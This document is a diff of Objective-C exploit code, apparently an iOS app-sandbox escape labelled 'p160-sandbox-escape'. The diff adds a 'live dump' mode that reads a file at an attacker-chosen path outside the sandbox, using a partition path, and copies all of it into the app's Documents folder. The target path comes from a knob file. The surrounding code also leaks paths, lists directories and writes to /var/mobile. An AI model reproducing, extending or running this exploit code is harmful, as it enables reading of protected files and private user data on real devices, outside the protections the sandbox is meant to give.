@@ -27,7 +27,7 @@ extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid
 #import <sys/stat.h>
 #import <unistd.h>
 
-#define P160_BUILD @"p160-sandbox-escape-v2c-query-swap-consume"
+#define P160_BUILD @"p160-sandbox-escape-v2d-live-dump"
 #define P160_MG_GROUP "systemgroup.com.apple.mobilegestaltcache"
 #define P160_FLAGS UINT64_C(0x8100000000)
 
@@ -483,6 +483,7 @@ typedef NS_ENUM(int, p160_c7_mode) {
     p160_c7_read = 0,
     p160_c7_list = 1,
     p160_c7_write = 2,
+    p160_c7_dump = 3,
 };
 
 static long __attribute__((unused)) p160_class7_op(NSString *target, int mode, NSMutableString *o, NSString **errOut) {
@@ -700,6 +701,43 @@ static long p160_class7_op2(NSString *target, int mode, NSMutableString *o, NSSt
                     [o appendFormat:@"  [v2] dir %@ — %d entries @part=%@ @obj=%@\n",
                         target, n, partPath, path ?: @"(null)"];
                     result = (opErr == 0) ? n : -1;
+                } else if (mode == p160_c7_dump) {
+                    int fd = open(partPath.fileSystemRepresentation, O_RDONLY);
+                    long total = -1;
+                    if (fd >= 0) {
+                        NSString *docs = NSSearchPathForDirectoriesInDomains(
+                            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+                        NSString *dst = [docs stringByAppendingPathComponent:
+                                         [@"p160_live_" stringByAppendingString:target.lastPathComponent]];
+                        int out = open(dst.fileSystemRepresentation,
+                                       O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (out >= 0) {
+                            uint8_t *buf = malloc(1 << 20);
+                            long sum = 0;
+                            ssize_t n;
+                            while (buf && (n = read(fd, buf, 1 << 20)) > 0) {
+                                ssize_t off = 0;
+                                while (off < n) {
+                                    ssize_t w = write(out, buf + off, (size_t)(n - off));
+                                    if (w <= 0) break;
+                                    off += w;
+                                }
+                                sum += n;
+                            }
+                            if (buf) free(buf);
+                            fsync(out);
+                            close(out);
+                            total = sum;
+                            [o appendFormat:@"  [v2] dump %@ — %ld bytes → %@ @part=%@\n",
+                                target, total, dst.lastPathComponent, partPath];
+                        } else {
+                            opErr = errno;
+                        }
+                        close(fd);
+                    } else {
+                        opErr = errno;
+                    }
+                    result = total;
                 } else {
                     int fd = open(partPath.fileSystemRepresentation,
                                   O_WRONLY | O_CREAT | O_TRUNC, 0644);
@@ -1028,7 +1066,7 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
         (unsigned long)g_p160_profile_groups.count,
         g_p160_profile_groups.count ? [@" — " stringByAppendingString:
             [g_p160_profile_groups componentsJoinedByString:@","]] : @""];
-    [o appendString:@"  [v2] knobs: p160_path.txt (read), p160_dir.txt (list), p160_write_target.txt (write, opt-in, /var/mobile)\n"];
+    [o appendString:@"  [v2] knobs: p160_path.txt (read), p160_dir.txt (list), p160_write_target.txt (write, opt-in, /var/mobile), p160_dump_path.txt (full read to Documents)\n"];
     if (g_p160_ent_groups.count || g_p160_profile_groups.count) {
         [o appendFormat:@"  [v2] app group live (%lu ent / %lu profile) — class-7 path/dir/write enabled\n",
             (unsigned long)g_p160_ent_groups.count,
@@ -1066,6 +1104,11 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
                 (void)p160_class7_op2(wr, p160_c7_write, o, NULL);
             }
         }
+        NSString *dp = [[NSString stringWithContentsOfFile:
+            [docs stringByAppendingPathComponent:@"p160_dump_path.txt"]
+            encoding:NSUTF8StringEncoding error:nil]
+            stringByTrimmingCharactersInSet:ws];
+        if (dp.length) (void)p160_class7_op2(dp, p160_c7_dump, o, NULL);
     }
 
     NSArray<NSDictionary *> *targets = @[
